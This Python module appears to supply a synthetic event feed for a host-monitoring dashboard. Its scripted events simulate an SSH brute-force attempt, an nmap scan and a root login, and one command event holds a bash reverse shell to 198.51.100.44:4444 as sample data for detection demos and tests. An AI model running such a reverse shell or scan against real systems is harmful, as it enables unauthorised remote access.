"""Synthetic event feed so the dashboard works without root."""

from __future__ import annotations

import threading
from datetime import datetime, timedelta
from typing import Callable

from watchdogs.models import CommandEvent, LoginEvent, Session

EmitFn = Callable[[str, object], None]


def _now() -> datetime:
    return datetime.now()


def scripted_events(now: datetime | None = None) -> list[tuple[str, object]]:
    """Deterministic sequence used by tests and the first demo burst."""
    ts = now or _now()
    events: list[tuple[str, object]] = [
        (
            "login",
            LoginEvent(
                ts=ts,
                result="accepted",
                username="kskroyal",
                source_ip="192.168.1.10",
                method="publickey",
                service="sshd",
            ),
        ),
        (
            "sessions",
            [
                Session(
                    username="kskroyal",
                    tty="pts/0",
                    source="192.168.1.10",
                    since=ts.strftime("%Y-%m-%d %H:%M"),
                )
            ],
        ),
        (
            "command",
            CommandEvent(
                ts=ts + timedelta(seconds=1),
                pid=4401,
                ppid=4400,
                uid=1000,
                username="kskroyal",
                cmdline="systemctl status sshd",
                source="demo",
            ),
        ),
        (
            "login",
            LoginEvent(
                ts=ts + timedelta(seconds=2),
                result="failed",
                username="admin",
                source_ip="203.0.113.8",
                method="password",
                service="sshd",
            ),
        ),
        (
            "login",
            LoginEvent(
                ts=ts + timedelta(seconds=2, milliseconds=200),
                result="failed",
                username="admin",
                source_ip="203.0.113.8",
                method="password",
                service="sshd",
            ),
        ),
        (
            "login",
            LoginEvent(
                ts=ts + timedelta(seconds=2, milliseconds=400),
                result="failed",
                username="root",
                source_ip="203.0.113.8",
                method="password",
                service="sshd",
            ),
        ),
        (
            "login",
            LoginEvent(
                ts=ts + timedelta(seconds=2, milliseconds=600),
                result="failed",
                username="ubuntu",
                source_ip="203.0.113.8",
                method="password",
                service="sshd",
            ),
        ),
        (
            "login",
            LoginEvent(
                ts=ts + timedelta(seconds=2, milliseconds=800),
                result="invalid",
                username="ghost",
                source_ip="203.0.113.8",
                method="password",
                service="sshd",
            ),
        ),
        (
            "login",
            LoginEvent(
                ts=ts + timedelta(seconds=3),
                result="accepted",
                username="root",
                source_ip="198.51.100.44",
                method="password",
                service="sshd",
            ),
        ),
        (
            "command",
            CommandEvent(
                ts=ts + timedelta(seconds=4),
                pid=5102,
                ppid=5100,
                uid=0,
                username="root",
                cmdline="nmap -sS 10.0.0.0/24",
                source="demo",
            ),
        ),
        (
            "login",
            LoginEvent(
                ts=ts + timedelta(seconds=5),
                result="sudo",
                username="kskroyal",
                method="sudo",
                service="sudo",
                tty="pts/0",
                extra={"target": "root", "pwd": "/home/kskroyal", "command": "/bin/bash"},
            ),
        ),
        (
            "command",
            CommandEvent(
                ts=ts + timedelta(seconds=5),
                pid=0,
                ppid=0,
                uid=0,
                username="kskroyal",
                cmdline="/bin/bash",
                tty="pts/0",
                source="sudo",
            ),
        ),
        (
            "command",
            CommandEvent(
                ts=ts + timedelta(seconds=6),
                pid=5220,
                ppid=5102,
                uid=0,
                username="root",
                cmdline="bash -c 'bash -i >& /dev/tcp/198.51.100.44/4444 0>&1'",
                source="demo",
            ),
        ),
        (
            "sessions",
            [
                Session(
                    username="kskroyal",
                    tty="pts/0",
                    source="192.168.1.10",
                    since=ts.strftime("%Y-%m-%d %H:%M"),
                ),
                Session(
                    username="root",
                    tty="pts/3",
                    source="198.51.100.44",
                    since=ts.strftime("%Y-%m-%d %H:%M"),
                ),
            ],
        ),
    ]
    return events


class DemoFeeder:
    def __init__(self, emit: EmitFn, interval: float = 4.0) -> None:
        self.emit = emit
        self.interval = interval

    def run(self, stop: threading.Event) -> None:
        for kind, payload in scripted_events():
            if stop.is_set():
                return
            self.emit(kind, payload)
            stop.wait(0.15)
        loop = 0
        while not stop.is_set():
            loop += 1
            if loop % 3 == 0:
                self.emit(
                    "login",
                    LoginEvent(
                        ts=_now(),
                        result="failed",
                        username="admin",
                        source_ip="203.0.113.8",
                        method="password",
                        service="sshd",
                    ),
                )
            stop.wait(self.interval)
